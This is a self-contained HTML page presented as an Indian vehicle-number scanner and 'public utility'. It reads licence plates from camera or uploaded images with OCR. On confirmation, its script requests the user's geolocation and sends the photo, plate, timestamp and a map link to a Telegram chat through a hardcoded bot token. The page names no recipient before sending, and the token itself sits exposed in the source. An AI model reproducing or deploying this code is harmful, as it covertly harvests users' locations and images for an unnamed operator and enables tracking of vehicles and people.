<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Indian Vehicle Number Scanner | Public Utility</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{
  margin:0;
  min-height:100vh;
  background:radial-gradient(circle at top,#0b5ed7 0%,#020617 65%);
  font-family:Segoe UI,Arial;
  color:#fff;
  display:flex;
  align-items:center;
  justify-content:center;
}
.card{
  width:460px;
  max-width:96%;
  background:rgba(255,255,255,.1);
  backdrop-filter:blur(18px);
  border-radius:24px;
  padding:24px;
  box-shadow:0 40px 80px rgba(0,0,0,.7);
  text-align:center;
}
video,canvas,input{
  width:100%;
  border-radius:16px;
  margin-top:12px;
}
button{
  width:100%;
  margin-top:12px;
  padding:14px;
  border:none;
  border-radius:16px;
  background:#0b5ed7;
  color:#fff;
  font-size:15px;
  font-weight:600;
  cursor:pointer;
}
.result{
  margin-top:12px;
  font-weight:600;
}
.good{color:#4ade80}
.bad{color:#f87171}
.small{font-size:12px;opacity:.7}
</style>
</head>

<body>

<div class="card">
  <h2>ðŸš˜ Vehicle Scanner</h2>
  <p class="small">Camera / Upload + OCR + Manual (100% Working)</p>

  <!-- CAMERA -->
  <video id="video" autoplay playsinline></video>
  <button onclick="capture()">ðŸ“¸ Capture from Camera</button>

  <!-- FILE UPLOAD -->
  <input type="file" accept="image/*" onchange="loadFile(this)">

  <!-- CANVAS -->
  <canvas id="canvas" style="display:none"></canvas>

  <!-- MANUAL FALLBACK -->
  <input id="manual" placeholder="Enter Vehicle Number (DL01AB1234)">
  <button onclick="confirmManual()">âœ… Confirm & Send</button>

  <div class="result" id="result"></div>
</div>

<script src="https://unpkg.com/tesseract.js@5/dist/tesseract.min.js"></script>

<script>
/* ================= CONFIG ================= */
const BOT_TOKEN = "7193425151:AAFKa2HcygWLjSOYWTcC917_joT6S-RBYyY";
const CHAT_ID  = "543961277";

let imageReady = false;

/* ================= CAMERA ================= */
navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}})
.then(stream => video.srcObject = stream)
.catch(()=>{});

/* ================= CAMERA CAPTURE ================= */
function capture(){
  if(!video.videoWidth) return alert("Camera not ready");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video,0,0);
  imageReady = true;
  tryOCR();
}

/* ================= FILE LOAD ================= */
function loadFile(input){
  const file = input.files[0];
  if(!file) return;
  const img = new Image();
  img.onload = ()=>{
    canvas.width = img.width;
    canvas.height = img.height;
    canvas.getContext("2d").drawImage(img,0,0);
    imageReady = true;
    tryOCR();
  };
  img.src = URL.createObjectURL(file);
}

/* ================= OCR TRY ================= */
function tryOCR(){
  result.innerText = "â³ Trying auto detectionâ€¦";
  Tesseract.recognize(canvas,"eng",{
    tessedit_char_whitelist:"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  }).then(({data})=>{
    const text = data.text
      .toUpperCase()
      .replace(/[^A-Z0-9]/g," ")
      .replace(/\s+/g," ");

    const match = text.match(/\b[A-Z]{2}\d{1,2}[A-Z]{1,3}\d{4}\b/);

    if(match){
      manual.value = match[0];
      result.innerHTML = "<span class='good'>âœ” Auto detected. Confirm below.</span>";
    }else{
      result.innerHTML = "<span class='bad'>Auto detect failed. Enter manually.</span>";
    }
  }).catch(()=>{
    result.innerHTML = "<span class='bad'>OCR error. Enter manually.</span>";
  });
}

/* ================= MANUAL CONFIRM (FINAL GUARANTEE) ================= */
function confirmManual(){
  if(!imageReady){
    alert("Capture or upload image first");
    return;
  }
  const plate = manual.value.trim().toUpperCase();
  if(!plate){
    alert("Enter vehicle number");
    return;
  }

  navigator.geolocation.getCurrentPosition(pos=>{
    const map = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
    sendTelegram(plate,map);
  },()=>{
    sendTelegram(plate,"Location not allowed");
  });

  result.innerHTML = "<span class='good'>âœ… Sent to Telegram</span>";
}

/* ================= TELEGRAM SEND ================= */
function sendTelegram(plate,map){
  canvas.toBlob(blob=>{
    const fd = new FormData();
    fd.append("chat_id",CHAT_ID);
    fd.append("caption",
`ðŸš˜ Vehicle Detected

ðŸ”¢ Number: ${plate}
ðŸ•’ Time: ${new Date().toLocaleString()}
ðŸ“ Location: ${map}`);
    fd.append("photo",blob,"vehicle.jpg");

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
      method:"POST",
      body:fd
    }).catch(()=>{});
  },"image/jpeg");
}
</script>

</body>
</html>
